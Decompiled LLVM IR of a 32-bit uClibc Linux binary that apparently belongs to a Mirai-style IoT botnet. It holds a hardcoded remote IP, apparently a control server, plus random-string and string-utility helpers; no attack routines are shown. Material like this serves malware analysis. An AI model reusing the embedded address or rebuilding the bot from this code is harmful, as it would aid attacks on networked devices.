source_filename = "test"
target datalayout = "e-m:e-p:32:32-f64:32:64-f80:32-n8:16:32-S128"

%_TYPEDEF_sigset_t = type { [1 x i32] }
%timespec = type { i32, i32 }
%sigcontext = type { i32 }
%sigaction = type { void (i32)*, i32, void ()*, %_TYPEDEF_sigset_t }
%pollfd = type { i32, i16, i16 }

@df = internal unnamed_addr global i1 false
@eax = internal unnamed_addr global i32 0
@ecx = internal unnamed_addr global i32 0
@edx = internal unnamed_addr global i32 0
@ebx = internal unnamed_addr global i32 0
@esp = internal unnamed_addr global i32 0
@ebp = internal unnamed_addr global i32 0
@esi = internal unnamed_addr global i32 0
@edi = internal unnamed_addr global i32 0
@0 = external global i32
@global_var_805200c.2 = global i32 0
@global_var_8052024.3 = local_unnamed_addr global i32* @global_var_805200c.2
@global_var_805189c.4 = constant i32 0
@global_var_80522e4.5 = global i32 0
@global_var_8052010.6 = local_unnamed_addr global i32 0
@global_var_8052310.8 = local_unnamed_addr global i32 0
@global_var_8052314.9 = local_unnamed_addr global i32 0
@global_var_8052318.10 = local_unnamed_addr global i32 0
@global_var_804ff30.11 = constant [37 x i8] c"kt8lmno5abghi6w7uvx2cdyz14pqef3rs9j0\00"
@global_var_804ff55.12 = constant [7 x i8] c"(null)\00"
@global_var_8052038 = external local_unnamed_addr global i32
@global_var_8050380.14 = constant i32 65536
@global_var_8052308.15 = local_unnamed_addr global i32 0
@global_var_8052300.16 = local_unnamed_addr global i32 0
@global_var_8052304.17 = local_unnamed_addr global i32 0
@global_var_8054564.18 = local_unnamed_addr global i32 0
@global_var_804ff5e.20 = constant i32 4915244
@global_var_8052030.22 = local_unnamed_addr global i32 -1
@global_var_804ff20.23 = constant [15 x i8] c"191.96.112.131\00"
@global_var_805202c.24 = global [15 x i8]* @global_var_804ff20.23
@global_var_804ff62.25 = constant i32 2097199
@global_var_804ff64.26 = constant i32 32
@global_var_8052040.27 = local_unnamed_addr global i32* @global_var_8050380.14
@global_var_8052520.28 = global i32 0
@global_var_805231c.29 = global i32 0
@global_var_8052320.30 = global i32 0
@global_var_80524ec.31 = global i32 0
@global_var_8052160.32 = global i32 0
@global_var_8054994.33 = local_unnamed_addr global i32 0
@global_var_8054988.34 = global i32 0
@global_var_8054580.35 = global i32 0
@global_var_8052044.36 = global i32 0
@global_var_805462c.38 = global i32 0
@global_var_8054630.39 = local_unnamed_addr global i32 0
@global_var_8054634.40 = global i32 0
@global_var_8054640.41 = local_unnamed_addr global i32 0
@global_var_8054934.42 = global i32 0
@global_var_805495c.43 = local_unnamed_addr global i32 0
@global_var_805494c.44 = local_unnamed_addr global i32 0
@global_var_8054950.45 = local_unnamed_addr global i32 0
@global_var_8054954.46 = local_unnamed_addr global i32 0
@global_var_8054970.47 = local_unnamed_addr global i32 0
@global_var_8054958.48 = local_unnamed_addr global i32 0
@global_var_8054964.49 = local_unnamed_addr global i32 0
@global_var_8054968.50 = local_unnamed_addr global i32 0
@global_var_8054974.51 = local_unnamed_addr global i32 0
@global_var_8054948.52 = local_unnamed_addr global i32 0
@global_var_8054944.54 = local_unnamed_addr global i32 0
@global_var_805496c.55 = local_unnamed_addr global i32 0
@global_var_805463c.56 = local_unnamed_addr global i32 0
@global_var_805205c.57 = global i32 0
@global_var_8052074.59 = global i32 0
@global_var_805208c = external global i32
@global_var_80520c4.61 = global i32 -1726662223
@global_var_8052094.62 = local_unnamed_addr global i32* @global_var_80520c4.61
@global_var_8052090.63 = global i32* @global_var_80520c4.61
@global_var_8050594.64 = constant i32 0
@global_var_8050580.65 = constant i32 0
@global_var_8052140.66 = global i32 0
@global_var_8052504.67 = local_unnamed_addr global i32 0
@global_var_8052000.69 = global i32 -1
@global_var_804b77f.70 = constant i32 -294069
@global_var_8052514.71 = local_unnamed_addr global i32 0
@global_var_8052518.72 = local_unnamed_addr global i32 0
@global_var_8050800.73 = constant [10 x i8] c"/dev/null\00"
@global_var_8052510.75 = local_unnamed_addr global i32 0
@global_var_8052508.76 = local_unnamed_addr global i32 0
@global_var_805250c.77 = local_unnamed_addr global i32 0
@global_var_8050bc5.78 = constant i32 1970153472
@global_var_8052158.79 = local_unnamed_addr global i32* @global_var_8050bc5.78
@global_var_804b967.80 = constant i32 1928542531
@global_var_804b98b.81 = constant i32 1928542531
@global_var_8052544.82 = local_unnamed_addr global i32 0
@global_var_8052524.83 = global i32 0
@global_var_8054998.87 = local_unnamed_addr global i32 0
@global_var_805080a.88 = constant i32 1697579054
@global_var_805083e.89 = constant i32 1868824690
@global_var_805080c.90 = constant [17 x i8] c"/etc/resolv.conf\00"
@global_var_805081d.91 = constant [24 x i8] c"/etc/config/resolv.conf\00"
@global_var_8050835.92 = constant [11 x i8] c"nameserver\00"
@global_var_8050840.93 = constant [7 x i8] c"domain\00"
@global_var_8050847.94 = constant [7 x i8] c"search\00"
@global_var_8054978.95 = global i32 0
@global_var_805499c.96 = local_unnamed_addr global i32 0
@global_var_80549a0.97 = local_unnamed_addr global i32 0
@global_var_80521a8.98 = global i32 0
@global_var_8052548.99 = local_unnamed_addr global i32 0
@global_var_805254c.100 = local_unnamed_addr global i32 0
@global_var_80521c0.101 = local_unnamed_addr global i32 2
@global_var_8052190.102 = global i32 0
@global_var_805218c.104 = global i32* bitcast (i16* @global_var_80521e0.103 to i32*)
@global_var_8050850.106 = constant i32 0
@global_var_805087c.107 = constant [17 x i8] c"0123456789abcdef\00"
@global_var_8050879.109 = constant [3 x i8] c"%x\00"
@global_var_805088d.110 = constant [11 x i8] c"/etc/hosts\00"
@global_var_8050898.111 = constant [18 x i8] c"/etc/config/hosts\00"
@global_var_80509c0.112 = constant i32 65536
@global_var_80522d4.113 = local_unnamed_addr global i32* @global_var_80509c0.112
@global_var_8050bc0.114 = constant [6 x i8] c"(nil)\00"
@global_var_8050bc6.115 = constant [7 x i8] c"(null)\00"
@global_var_8050bcd.116 = constant i32 2949163
@global_var_8050c3a.118 = constant i32 327688
@global_var_8050c32.119 = constant [8 x i8] c" +0-#'I\00"
@global_var_8050be0.120 = constant [9 x i8] c"hlLjztqZ\00"
@global_var_8050c1d.121 = constant [21 x i8] c"npxXoudifFeEgGaACScs\00"
@global_var_8050c13.122 = constant i32 117506048
@global_var_8050c04.123 = constant i32 331776
@global_var_8050c80.124 = constant [8 x i8] c"Success\00"
@global_var_8050c5e.125 = constant [15 x i8] c"Unknown error \00"
@global_var_80517ec.127 = constant [4 x i8] c"inf\00"
@global_var_80517ef.132 = constant i32 1179535616
@global_var_80517fc.133 = constant i32 2883630
@global_var_80522e0.1 = local_unnamed_addr global i8 0
@global_var_805230c.7 = local_unnamed_addr global i8 0
@1 = internal constant [2 x i8] c"S\00"
@global_var_804ff5c.19 = constant i8* getelementptr inbounds ([2 x i8], [2 x i8]* @1, i32 0, i32 0)
@2 = internal constant [2 x i8] c"K\00"
@global_var_804ff60.21 = constant i8* getelementptr inbounds ([2 x i8], [2 x i8]* @2, i32 0, i32 0)
@global_var_8054600.37 = global i8 0
@global_var_8054960.53 = local_unnamed_addr global i8 0
@global_var_8052500.58 = local_unnamed_addr global i8 0
@global_var_805251c.74 = local_unnamed_addr global i8 0
@global_var_8052528.84 = external global i8*
@global_var_8052540.85 = local_unnamed_addr global i64 0
@global_var_805215c.86 = local_unnamed_addr global i16 1
@global_var_80521e0.103 = global i16 288
@global_var_8052230.105 = local_unnamed_addr global i16 272
@global_var_8050c52.117 = external constant i8*
@global_var_8051800.130 = constant x86_fp80* null

declare void @__pseudo_call(i32) local_unnamed_addr

declare void @__pseudo_cond_branch(i1, i32) local_unnamed_addr

define i32 @_init() local_unnamed_addr {
entry:
  %v0_8048097 = load i32, i32* @ebx, align 4
  %v1_8048098 = call i32 @__get_pc_thunk_bx(i32 %v0_8048097)
  %v0_804809d = load i32, i32* @ebx, align 4
  %v1_804809d = add i32 %v0_804809d, 40823
  store i32 %v1_804809d, i32* @ebx, align 4
  %v0_80480a3 = call i32 @frame_dummy()
  %v0_80480a8 = call i32 @__do_global_ctors_aux()
  ret i32 %v0_80480a8
}

define i32 @__get_pc_thunk_bx(i32 %arg1) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @ebx, align 4
  %v0_80480b3 = load i32, i32* @eax, align 4
  ret i32 %v0_80480b3
}

define i32 @__do_global_dtors_aux() local_unnamed_addr {
entry:
  %v0_80480c6 = load i8, i8* @global_var_80522e0.1, align 32
  %v1_80480c6 = icmp eq i8 %v0_80480c6, 0
  br i1 %v1_80480c6, label %dec_label_pc_80480db.preheader, label %entry.dec_label_pc_8048102_crit_edge

entry.dec_label_pc_8048102_crit_edge:             ; preds = %entry
  %v0_8048103.pre = load i32, i32* @eax, align 4
  br label %dec_label_pc_8048102

dec_label_pc_80480db.preheader:                   ; preds = %entry
  %v0_80480db1 = load i32, i32* bitcast (i32** @global_var_8052024.3 to i32*), align 4
  %v1_80480e22 = icmp eq i32 %v0_80480db1, 0
  %v1_80480e49 = icmp eq i1 %v1_80480e22, false
  br i1 %v1_80480e49, label %dec_label_pc_80480d1.lr.ph, label %dec_label_pc_80480e6

dec_label_pc_80480d1.lr.ph:                       ; preds = %dec_label_pc_80480db.preheader
  br label %dec_label_pc_80480d1

dec_label_pc_80480d1:                             ; preds = %dec_label_pc_80480d1.lr.ph, %dec_label_pc_80480d1
  %v0_80480d1 = phi i32 [ %v0_80480db1, %dec_label_pc_80480d1.lr.ph ], [ %v0_80480db, %dec_label_pc_80480d1 ]
  %v1_80480d1 = add i32 %v0_80480d1, 4
  store i32 %v1_80480d1, i32* bitcast (i32** @global_var_8052024.3 to i32*), align 4
  call void @__pseudo_call(i32 %v0_80480d1)
  %v0_80480db = load i32, i32* bitcast (i32** @global_var_8052024.3 to i32*), align 4
  %v1_80480e2 = icmp eq i32 %v0_80480db, 0
  %v1_80480e4 = icmp eq i1 %v1_80480e2, false
  br i1 %v1_80480e4, label %dec_label_pc_80480d1, label %dec_label_pc_80480db.dec_label_pc_80480e6_crit_edge

dec_label_pc_80480db.dec_label_pc_80480e6_crit_edge: ; preds = %dec_label_pc_80480d1
  br label %dec_label_pc_80480e6

dec_label_pc_80480e6:                             ; preds = %dec_label_pc_80480db.dec_label_pc_80480e6_crit_edge, %dec_label_pc_80480db.preheader
  store i8 1, i8* @global_var_80522e0.1, align 32
  br label %dec_label_pc_8048102

dec_label_pc_8048102:                             ; preds = %entry.dec_label_pc_8048102_crit_edge, %dec_label_pc_80480e6
  %v0_8048103 = phi i32 [ %v0_8048103.pre, %entry.dec_label_pc_8048102_crit_edge ], [ 0, %dec_label_pc_80480e6 ]
  ret i32 %v0_8048103

; uselistorder directives
  uselistorder i32 %v0_80480db, { 1, 0 }
  uselistorder i32 %v0_80480d1, { 1, 0 }
  uselistorder i32* bitcast (i32** @global_var_8052024.3 to i32*), { 1, 2, 0 }
  uselistorder i8* @global_var_80522e0.1, { 1, 0 }
  uselistorder label %dec_label_pc_8048102, { 1, 0 }
  uselistorder label %dec_label_pc_80480d1, { 1, 0 }
}

define i32 @frame_dummy() local_unnamed_addr {
entry:
  %stack_var_-4 = alloca i32, align 4
  %v0_8048110 = load i32, i32* @ebp, align 4
  store i32 %v0_8048110, i32* %stack_var_-4, align 4
  %v4_8048110 = ptrtoint i32* %stack_var_-4 to i32
  store i32 0, i32* @eax, align 4
  store i32 %v4_8048110, i32* @ebp, align 4
  %v0_804811b = call i32 @function_8048120()
  ret i32 %v0_804811b

; uselistorder directives
  uselistorder i32* %stack_var_-4, { 1, 0 }
}

define i32 @function_8048120() local_unnamed_addr {
dec_label_pc_8048120:
  %v0_8048127 = load i32, i32* @eax, align 4
  %v1_8048127 = icmp eq i32 %v0_8048127, 0
  br i1 %v1_8048127, label %dec_label_pc_804814a, label %dec_label_pc_804812b

dec_label_pc_804812b:                             ; preds = %dec_label_pc_8048120
  %v1_8048145 = call i32 @unknown_0(i32 ptrtoint (i32* @global_var_805189c.4 to i32))
  br label %dec_label_pc_804814a

dec_label_pc_804814a:                             ; preds = %dec_label_pc_8048120, %dec_label_pc_804812b
  %v0_804814a = load i32, i32* @global_var_8052010.6, align 16
  %v1_804814f = icmp eq i32 %v0_804814a, 0
  br i1 %v1_804814f, label %dec_label_pc_8048165, label %dec_label_pc_8048153

dec_label_pc_8048153:                             ; preds = %dec_label_pc_804814a
  br label %dec_label_pc_8048165

dec_label_pc_8048165:                             ; preds = %dec_label_pc_8048153, %dec_label_pc_804814a
  ret i32 0

; uselistorder directives
  uselistorder label %dec_label_pc_804814a, { 1, 0 }
}

define i32 @_start(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-4 = alloca i32, align 4
  %stack_var_4 = alloca i32, align 4
  store i32 0, i32* @ebp, align 4
  store i32 %arg1, i32* @esi, align 4
  %v0_8048170 = load i32, i32* @eax, align 4
  store i32 %v0_8048170, i32* %stack_var_-4, align 4
  %v4_8048170 = ptrtoint i32* %stack_var_-4 to i32
  %v0_8048172 = load i32, i32* @edx, align 4
  %v9_8048184 = call i32 @__uClibc_main(i32 134517788, i32 %arg1, i32* nonnull %stack_var_4, i32 134512788, i32 134545156, i32 %v0_8048172, i32 %v4_8048170, i32 %v0_8048170)
  ret i32 %v9_8048184

; uselistorder directives
  uselistorder i32* %stack_var_-4, { 1, 0 }
}

define i32 @rand_init() local_unnamed_addr {
entry:
  %stack_var_-8 = alloca i32, align 4
  %v0_804818f = load i32, i32* @ebx, align 4
  store i32 %v0_804818f, i32* %stack_var_-8, align 4
  %v2_804819a = call i32 @__GI_time(i32* null)
  %v1_804819f = trunc i32 %v2_804819a to i8
  store i8 %v1_804819f, i8* @global_var_805230c.7, align 4
  %v0_80481a4 = call i32 @__libc_getpid()
  store i32 %v0_80481a4, i32* @ebx, align 4
  %v1_80481ab = call i32 @getppid(i32 0)
  %v1_80481b0 = load i32, i32* @ebx, align 4
  %v2_80481b0 = xor i32 %v1_80481b0, %v1_80481ab
  store i32 %v2_80481b0, i32* @global_var_8052310.8, align 16
  %v0_80481b7 = call i32 @clock()
  store i32 %v0_80481b7, i32* @global_var_8052314.9, align 4
  %v0_80481c7 = load i32, i32* @global_var_8052310.8, align 16
  %v2_80481cc = xor i32 %v0_80481c7, %v0_80481b7
  store i32 %v2_80481cc, i32* @global_var_8052318.10, align 8
  %v2_80481d6 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_80481d6, i32* @ebx, align 4
  ret i32 %v2_80481cc
}

define i32 @rand_next() local_unnamed_addr {
entry:
  %v0_80481df = load i8, i8* @global_var_805230c.7, align 1
  %v1_80481df = sext i8 %v0_80481df to i32
  %v2_80481f3 = udiv i32 %v1_80481df, 256
  %v6_80481f6 = xor i32 %v2_80481f3, %v1_80481df
  %v0_80481f9 = load i32, i32* @global_var_8052310.8, align 16
  %v1_80481fe = trunc i32 %v0_80481f9 to i8
  store i8 %v1_80481fe, i8* @global_var_805230c.7, align 4
  %v0_8048203 = load i32, i32* @global_var_8052314.9, align 4
  store i32 %v0_8048203, i32* @global_var_8052310.8, align 16
  %v0_804820d = load i32, i32* @global_var_8052318.10, align 8
  store i32 %v0_804820d, i32* @global_var_8052314.9, align 4
  %v2_804821e = udiv i32 %v0_804820d, 524288
  store i32 %v2_804821e, i32* @edx, align 4
  %sext = mul i32 %v6_80481f6, 16777216
  %v5_8048232 = sdiv i32 %sext, 16777216
  %v2_8048226 = xor i32 %v5_8048232, %v0_804820d
  %v6_8048232 = xor i32 %v2_8048226, %v2_804821e
  store i32 %v6_8048232, i32* @global_var_8052318.10, align 8
  ret i32 %v6_8048232

; uselistorder directives
  uselistorder i32 %v2_804821e, { 1, 0 }
  uselistorder i32 %v0_804820d, { 1, 0, 2 }
  uselistorder i32 %v1_80481df, { 1, 0 }
  uselistorder i8* @global_var_805230c.7, { 2, 1, 0 }
}

define i32 @rand_str(i16* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %tmp59 = icmp slt i32 %arg2, 1
  %tmp610 = icmp eq i1 %tmp59, false
  br i1 %tmp610, label %dec_label_pc_8048247, label %dec_label_pc_80482a1

dec_label_pc_8048247:                             ; preds = %entry, %dec_label_pc_804829b.backedge
  %stack_var_8.012 = phi i32 [ %stack_var_8.0.be, %dec_label_pc_804829b.backedge ], [ %arg2, %entry ]
  %stack_var_4.011 = phi i16* [ %stack_var_4.0.be, %dec_label_pc_804829b.backedge ], [ %arg1, %entry ]
  %v7_804824b = icmp sgt i32 %stack_var_8.012, 3
  br i1 %v7_804824b, label %dec_label_pc_804824d, label %dec_label_pc_8048266

dec_label_pc_804824d:                             ; preds = %dec_label_pc_8048247
  %v4_804824d = ptrtoint i16* %stack_var_4.011 to i32
  %v0_8048250 = call i32 @rand_next()
  %v2_8048255 = bitcast i16* %stack_var_4.011 to i32*
  store i32 %v0_8048250, i32* %v2_8048255, align 4
  %v5_8048257 = add i32 %v4_804824d, 4
  %v1_804825e = add i32 %stack_var_8.012, -4
  store i32 %v1_804825e, i32* @eax, align 4
  br label %dec_label_pc_804829b.backedge

dec_label_pc_8048266:                             ; preds = %dec_label_pc_8048247
  %v7_804826a = icmp sgt i32 %stack_var_8.012, 1
  br i1 %v7_804826a, label %dec_label_pc_804826c, label %dec_label_pc_8048289

dec_label_pc_804826c:                             ; preds = %dec_label_pc_8048266
  %v4_804826c = ptrtoint i16* %stack_var_4.011 to i32
  %v0_804826f = call i32 @rand_next()
  %v1_8048277 = trunc i32 %v0_804826f to i16
  store i16 %v1_8048277, i16* %stack_var_4.011, align 2
  %v5_804827a = add i32 %v4_804826c, 2
  %v1_8048281 = add i32 %stack_var_8.012, -2
  store i32 %v1_8048281, i32* @eax, align 4
  br label %dec_label_pc_804829b.backedge

dec_label_pc_8048289:                             ; preds = %dec_label_pc_8048266
  %v5_8048266 = add i32 %stack_var_8.012, -1
  %v0_8048289 = call i32 @rand_next()
  %v4_8048290 = ptrtoint i16* %stack_var_4.011 to i32
  store i32 %v4_8048290, i32* @eax, align 4
  %v1_8048293 = trunc i32 %v0_8048289 to i8
  %v3_8048293 = bitcast i16* %stack_var_4.011 to i8*
  store i8 %v1_8048293, i8* %v3_8048293, align 1
  %v5_8048295 = add i32 %v4_8048290, 1
  br label %dec_label_pc_804829b.backedge

dec_label_pc_804829b.backedge:                    ; preds = %dec_label_pc_8048289, %dec_label_pc_804824d, %dec_label_pc_804826c
  %stack_var_4.0.be.in = phi i32 [ %v5_8048257, %dec_label_pc_804824d ], [ %v5_804827a, %dec_label_pc_804826c ], [ %v5_8048295, %dec_label_pc_8048289 ]
  %stack_var_8.0.be = phi i32 [ %v1_804825e, %dec_label_pc_804824d ], [ %v1_8048281, %dec_label_pc_804826c ], [ %v5_8048266, %dec_label_pc_8048289 ]
  %stack_var_4.0.be = inttoptr i32 %stack_var_4.0.be.in to i16*
  %tmp5 = icmp slt i32 %stack_var_8.0.be, 1
  %tmp6 = icmp eq i1 %tmp5, false
  br i1 %tmp6, label %dec_label_pc_8048247, label %dec_label_pc_804829b.dec_label_pc_80482a1_crit_edge

dec_label_pc_804829b.dec_label_pc_80482a1_crit_edge: ; preds = %dec_label_pc_804829b.backedge
  br label %dec_label_pc_80482a1

dec_label_pc_80482a1:                             ; preds = %dec_label_pc_804829b.dec_label_pc_80482a1_crit_edge, %entry
  %v0_80482a3 = load i32, i32* @eax, align 4
  ret i32 %v0_80482a3

; uselistorder directives
  uselistorder i32 %stack_var_8.0.be, { 1, 0 }
  uselistorder i16* %stack_var_4.011, { 4, 5, 1, 3, 0, 2 }
  uselistorder i32 %stack_var_8.012, { 3, 4, 2, 1, 0 }
  uselistorder label %dec_label_pc_804829b.backedge, { 0, 2, 1 }
  uselistorder label %dec_label_pc_8048247, { 1, 0 }
}

define i32 @rand_alphastr(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %stack_var_-61 = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v0_80482a8 = load i32, i32* @esi, align 4
  store i32 %v0_80482a8, i32* %stack_var_-12, align 4
  %tmp16 = bitcast i32* %stack_var_-61 to i8*
  store i1 false, i1* @df, align 1
  %v7_80482ba = call i8* @_memcpy(i8* %tmp16, i8* getelementptr inbounds ([37 x i8], [37 x i8]* @global_var_804ff30.11, i32 0, i32 0), i32 37)
  %tmp1726 = icmp slt i32 %arg2, 1
  %tmp1827 = icmp eq i1 %tmp1726, false
  br i1 %tmp1827, label %dec_label_pc_80482c1, label %dec_label_pc_8048364

dec_label_pc_80482c1:                             ; preds = %entry, %dec_label_pc_804835a.backedge
  %stack_var_4.129 = phi i8* [ %stack_var_4.1.be, %dec_label_pc_804835a.backedge ], [ %arg1, %entry ]
  %stack_var_8.028 = phi i32 [ %stack_var_8.0.be, %dec_label_pc_804835a.backedge ], [ %arg2, %entry ]
  %tmp = icmp ult i32 %stack_var_8.028, 4
  %v0_8048311 = call i32 @rand_next()
  br i1 %tmp, label %dec_label_pc_8048311, label %dec_label_pc_80482c9

dec_label_pc_80482c9:                             ; preds = %dec_label_pc_80482c1
  br label %dec_label_pc_80482da

dec_label_pc_80482da:                             ; preds = %dec_label_pc_80482c9, %dec_label_pc_80482da
  %stack_var_-20.023.in = phi i32 [ %v0_8048311, %dec_label_pc_80482c9 ], [ %v6_80482e0, %dec_label_pc_80482da ]
  %storemerge22 = phi i32 [ 0, %dec_label_pc_80482c9 ], [ %v4_80482fb, %dec_label_pc_80482da ]
  %stack_var_4.021 = phi i8* [ %stack_var_4.129, %dec_label_pc_80482c9 ], [ %v22_80482f8, %dec_label_pc_80482da ]
  %stack_var_-20.023 = trunc i32 %stack_var_-20.023.in to i8
  %sext = mul i32 %stack_var_-20.023.in, 16777216
  %v4_80482da = sdiv i32 %sext, 16777216
  %v6_80482e0 = udiv i32 %v4_80482da, 256
  %v5_80482e4 = udiv i8 %stack_var_-20.023, 8
  %v4_80482e8 = zext i8 %v5_80482e4 to i32
  %v0_80482ec = load i32, i32* @ebp, align 4
  %v2_80482ec = add nsw i32 %v4_80482e8, -57
  %v3_80482ec = add i32 %v2_80482ec, %v0_80482ec
  %v4_80482ec = inttoptr i32 %v3_80482ec to i8*
  %v5_80482ec = load i8, i8* %v4_80482ec, align 1
  %v6_80482ec = zext i8 %v5_80482ec to i32
  %v2_80482f1 = load i32, i32* @edx, align 4
  %v3_80482f1 = and i32 %v2_80482f1, -256
  %v4_80482f1 = or i32 %v3_80482f1, %v6_80482ec
  store i32 %v4_80482f1, i32* @edx, align 4
  %v4_80482f3 = ptrtoint i8* %stack_var_4.021 to i32
  store i8 %v5_80482ec, i8* %stack_var_4.021, align 1
  %v5_80482f8 = add i32 %v4_80482f3, 1
  %v22_80482f8 = inttoptr i32 %v5_80482f8 to i8*
  %v4_80482fb = add i32 %storemerge22, 1
  %tmp30 = icmp ult i32 %v4_80482fb, 4
  br i1 %tmp30, label %dec_label_pc_80482da, label %dec_label_pc_8048306

dec_label_pc_8048306:                             ; preds = %dec_label_pc_80482da
  %v1_8048309 = add i32 %stack_var_8.028, -4
  store i32 %v1_8048309, i32* @eax, align 4
  br label %dec_label_pc_804835a.backedge

dec_label_pc_8048311:                             ; preds = %dec_label_pc_80482c1
  %v2_804832f = urem i32 %v0_8048311, 37
  %v14_8048346 = trunc i32 %v2_804832f to i8
  %v4_804834f = ptrtoint i8* %stack_var_4.129 to i32
  store i32 %v4_804834f, i32* @eax, align 4
  store i8 %v14_8048346, i8* %stack_var_4.129, align 1
  %v5_8048354 = add i32 %v4_804834f, 1
  %v22_8048354 = inttoptr i32 %v5_8048354 to i8*
  %v4_8048357 = add i32 %stack_var_8.028, -1
  br label %dec_label_pc_804835a.backedge

dec_label_pc_804835a.backedge:                    ; preds = %dec_label_pc_8048311, %dec_label_pc_8048306
  %stack_var_8.0.be = phi i32 [ %v4_8048357, %dec_label_pc_8048311 ], [ %v1_8048309, %dec_label_pc_8048306 ]
  %stack_var_4.1.be = phi i8* [ %v22_8048354, %dec_label_pc_8048311 ], [ %v22_80482f8, %dec_label_pc_8048306 ]
  %tmp17 = icmp slt i32 %stack_var_8.0.be, 1
  %tmp18 = icmp eq i1 %tmp17, false
  br i1 %tmp18, label %dec_label_pc_80482c1, label %dec_label_pc_8048364

dec_label_pc_8048364:                             ; preds = %dec_label_pc_804835a.backedge, %entry
  %v2_8048367 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_8048367, i32* @esi, align 4
  %v0_804836a = load i32, i32* @eax, align 4
  ret i32 %v0_804836a

; uselistorder directives
  uselistorder i32 %stack_var_8.0.be, { 1, 0 }
  uselistorder i32 %stack_var_8.028, { 1, 2, 0 }
  uselistorder label %dec_label_pc_80482da, { 1, 0 }
  uselistorder label %dec_label_pc_80482c1, { 1, 0 }
}

define i32 @util_strlen(i8* %arg1) local_unnamed_addr {
entry:
  %v0_804836b = load i32, i32* @ebp, align 4
  %v4_804837d6 = ptrtoint i8* %arg1 to i32
  %v2_80483807 = load i8, i8* %arg1, align 1
  %v4_80483838 = icmp eq i8 %v2_80483807, 0
  %v1_80483859 = icmp eq i1 %v4_80483838, false
  %v4_804838b11 = icmp eq i1 %v1_80483859, false
  %v1_804838d12 = icmp eq i1 %v4_804838b11, false
  br i1 %v1_804838d12, label %dec_label_pc_804837a, label %dec_label_pc_804838f

dec_label_pc_804837a:                             ; preds = %entry, %dec_label_pc_804837a
  %v4_804837d14 = phi i32 [ %v5_8048388, %dec_label_pc_804837a ], [ %v4_804837d6, %entry ]
  %storemerge13 = phi i32 [ %v4_804837a, %dec_label_pc_804837a ], [ 0, %entry ]
  %v5_8048388 = add i32 %v4_804837d14, 1
  %v22_8048388 = inttoptr i32 %v5_8048388 to i8*
  %v4_804837a = add i32 %storemerge13, 1
  %v2_8048380 = load i8, i8* %v22_8048388, align 1
  %v4_8048383 = icmp eq i8 %v2_8048380, 0
  %v1_8048385 = icmp eq i1 %v4_8048383, false
  %v4_804838b = icmp eq i1 %v1_8048385, false
  %v1_804838d = icmp eq i1 %v4_804838b, false
  br i1 %v1_804838d, label %dec_label_pc_804837a, label %dec_label_pc_804838f

dec_label_pc_804838f:                             ; preds = %dec_label_pc_804837a, %entry
  %storemerge.lcssa = phi i32 [ 0, %entry ], [ %v4_804837a, %dec_label_pc_804837a ]
  store i32 %v0_804836b, i32* @ebp, align 4
  ret i32 %storemerge.lcssa

; uselistorder directives
  uselistorder i32 %v5_8048388, { 1, 0 }
  uselistorder label %dec_label_pc_804837a, { 1, 0 }
}

define i32 @util_memcpy(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %eax.global-to-local, align 4
  %v13_80483bc12 = icmp eq i32 %arg3, 0
  %v1_80483c014 = icmp eq i1 %v13_80483bc12, false
  br i1 %v1_80483c014, label %dec_label_pc_80483a8, label %dec_label_pc_80483c2

dec_label_pc_80483a8:                             ; preds = %entry, %dec_label_pc_80483a8
  %storemerge.in17 = phi i32 [ %v5_80483b6, %dec_label_pc_80483a8 ], [ %arg2, %entry ]
  %stack_var_12.016 = phi i32 [ %v4_80483b9, %dec_label_pc_80483a8 ], [ %arg3, %entry ]
  %stack_var_-12.015 = phi i8* [ %v22_80483b3, %dec_label_pc_80483a8 ], [ %arg1, %entry ]
  %v4_80483b9 = add i32 %stack_var_12.016, -1
  %storemerge = inttoptr i32 %storemerge.in17 to i8*
  store i32 %storemerge.in17, i32* %eax.global-to-local, align 4
  %v2_80483ab = load i8, i8* %storemerge, align 1
  %v4_80483ae = ptrtoint i8* %stack_var_-12.015 to i32
  store i32 %v4_80483ae, i32* %eax.global-to-local, align 4
  store i8 %v2_80483ab, i8* %stack_var_-12.015, align 1
  %v5_80483b3 = add i32 %v4_80483ae, 1
  %v22_80483b3 = inttoptr i32 %v5_80483b3 to i8*
  %v5_80483b6 = add i32 %storemerge.in17, 1
  %v13_80483bc = icmp eq i32 %v4_80483b9, 0
  %v1_80483c0 = icmp eq i1 %v13_80483bc, false
  br i1 %v1_80483c0, label %dec_label_pc_80483a8, label %dec_label_pc_80483b9.dec_label_pc_80483c2_crit_edge

dec_label_pc_80483b9.dec_label_pc_80483c2_crit_edge: ; preds = %dec_label_pc_80483a8
  %v0_80483c3.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80483c2

dec_label_pc_80483c2:                             ; preds = %dec_label_pc_80483b9.dec_label_pc_80483c2_crit_edge, %entry
  %v0_80483c3 = phi i32 [ %v0_80483c3.pre, %dec_label_pc_80483b9.dec_label_pc_80483c2_crit_edge ], [ %arg2, %entry ]
  ret i32 %v0_80483c3

; uselistorder directives
  uselistorder i32 %v4_80483b9, { 1, 0 }
  uselistorder i32 %storemerge.in17, { 2, 1, 0 }
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder label %dec_label_pc_80483a8, { 1, 0 }
}

define i32 @util_strcpy(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %stack_var_-4 = alloca i32, align 4
  %v0_80483c4 = load i32, i32* @ebp, align 4
  store i32 %v0_80483c4, i32* %stack_var_-4, align 4
  %v4_80483c4 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v4_80483c4, i32* @ebp, align 4
  %v1_80483d0 = inttoptr i32 %arg2 to i8*
  %v2_80483d0 = call i32 @util_strlen(i8* %v1_80483d0)
  %v1_80483db = add i32 %v2_80483d0, 1
  %v3_80483ed = inttoptr i32 %arg1 to i8*
  %v4_80483ed = call i32 @util_memcpy(i8* %v3_80483ed, i32 %arg2, i32 %v1_80483db)
  %v2_80483f5 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_80483f5, i32* @ebp, align 4
  ret i32 %v2_80483d0

; uselistorder directives
  uselistorder i32* %stack_var_-4, { 0, 2, 1 }
  uselistorder i32 %arg2, { 1, 0 }
}

